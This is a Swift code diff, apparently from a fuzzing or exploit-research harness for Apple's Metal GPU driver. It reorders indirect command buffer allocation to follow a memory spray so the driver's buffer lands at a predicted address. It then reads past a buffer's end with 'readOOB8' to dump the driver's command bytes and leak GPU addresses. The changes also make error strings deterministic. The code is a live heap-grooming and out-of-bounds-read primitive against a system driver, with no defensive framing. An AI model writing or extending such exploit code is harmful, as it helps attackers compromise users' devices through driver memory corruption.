@@ -2844,21 +2844,6 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
             step("✗ PSO failed"); completion(); return
         }
 
-        let icbDesc = MTLIndirectCommandBufferDescriptor()
-        icbDesc.commandTypes              = [.draw]
-        icbDesc.inheritBuffers            = false
-        icbDesc.maxVertexBufferBindCount  = 1
-        icbDesc.maxFragmentBufferBindCount = 0
-        guard let icb = device.makeIndirectCommandBuffer(descriptor: icbDesc,
-                                                          maxCommandCount: 1,
-                                                          options: .storageModeShared) else {
-            step("✗ ICB alloc failed"); completion(); return
-        }
-        let slot = icb.indirectRenderCommandAt(0)
-        slot.setRenderPipelineState(pso)
-        slot.setVertexBuffer(sentinelBuf, offset: 0, at: 0)
-        slot.drawPrimitives(.point, vertexStart: 0, vertexCount: 1, instanceCount: 1, baseInstance: 0)
-
         // Spray to lo ONLY — leave lo+BUF_LEN free so the Metal driver's ICB argument
         // buffer lands at that VA when the command buffer is committed.
         // lo.contents()+BUF_LEN reaches the driver's buffer in CPU VA space because
@@ -2895,6 +2880,43 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
             for bi in 0..<4 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
         }
 
+        // Create ICB AFTER spray: storageModeShared backing store now allocates at nextGPUVA.
+        // lo.contents()+BUF_LEN overlaps the ICB's raw command bytes in CPU VA space.
+        step("── pre-encode lo+BUF_LEN (should be zeros — ICB slot not yet written) ──")
+        do {
+            var h = "  [+0x000]: "
+            for i in 0..<16 { h += String(format: "%02x ", loPtr[BUF_LEN+i]) }
+            step(h)
+        }
+        let icbDesc = MTLIndirectCommandBufferDescriptor()
+        icbDesc.commandTypes              = [.draw]
+        icbDesc.inheritBuffers            = false
+        icbDesc.maxVertexBufferBindCount  = 1
+        icbDesc.maxFragmentBufferBindCount = 0
+        guard let icb = device.makeIndirectCommandBuffer(descriptor: icbDesc,
+                                                          maxCommandCount: 1,
+                                                          options: .storageModeShared) else {
+            step("✗ ICB alloc failed"); completion(); return
+        }
+        let slot = icb.indirectRenderCommandAt(0)
+        slot.setRenderPipelineState(pso)
+        slot.setVertexBuffer(sentinelBuf, offset: 0, at: 0)
+        slot.drawPrimitives(.point, vertexStart: 0, vertexCount: 1, instanceCount: 1, baseInstance: 0)
+        step("── post-encode lo+BUF_LEN (non-zeros = ICB cmd bytes at nextGPUVA ✓) ──")
+        for row in 0..<32 {
+            let base = row * 16
+            var h = "  [+0x\(String(format: "%03x", base))]: "
+            for i in 0..<16 { h += String(format: "%02x ", loPtr[BUF_LEN+base+i]) }
+            for i in stride(from: 0, through: 8, by: 8) {
+                let off = base + i; guard off + 7 < 512 else { break }
+                let v = readOOB8(off)
+                if v == sentVA        { h += " sentVA@+\(String(format:"%x",off))" }
+                if v == lo.gpuAddress { h += " loVA@+\(String(format:"%x",off))" }
+                if v == nextGPUVA     { h += " nextVA@+\(String(format:"%x",off))" }
+            }
+            step(h)
+        }
+
         // Allocate dummyTex ONCE — keeps its resource ID stable across all probe calls
         let texDesc = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
                                                                width: 1, height: 1, mipmapped: false)
@@ -2915,23 +2937,27 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
 
         step("driver arg-buf target gpuVA=0x\(String(nextGPUVA,radix:16))")
 
-        // probeExecFull — fresh queue per call + encoder PSO + useResource(sentinelBuf)
-        // Metal requires the render encoder to have a PSO set even when the ICB command
-        // provides its own PSO (inheritPipelineState=false). Without this the GPU has
-        // no pipeline state for the render pass → code=3 page fault on every execution.
+        // Sort userInfo keys for deterministic error strings (NSDictionary order is random).
+        func stableErrStr(_ e: NSError) -> String {
+            var s = "code=\(e.code)"
+            for k in e.userInfo.keys.sorted() {
+                if k == NSUnderlyingErrorKey, let u = e.userInfo[k] as? NSError {
+                    s += " [\(k):\(stableErrStr(u))]"
+                } else { s += " [\(k):\(e.userInfo[k]!)]" }
+            }
+            return s
+        }
         func probeExecFull() -> (Bool, String) {
             guard let freshQ = device.makeCommandQueue(),
                   let cb     = freshQ.makeCommandBuffer(),
                   let enc    = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { return (false, "no cb") }
-            enc.setRenderPipelineState(pso)      // ← required: encoder needs its own PSO
+            enc.setRenderPipelineState(pso)
             enc.useResource(sentinelBuf, usage: .read)
             enc.executeCommandsInBuffer(icb, range: 0..<1)
             enc.endEncoding()
             cb.commit(); cb.waitUntilCompleted()
             guard let err = cb.error as NSError? else { return (false, "") }
-            var s = "code=\(err.code) dom=\(err.domain)"
-            for (k, v) in err.userInfo { s += " [\(k):\(v)]" }
-            return (true, s)
+            return (true, stableErrStr(err))
         }
 
         // ── Phase D: driver arg-buf capture ──────────────────────────────────────
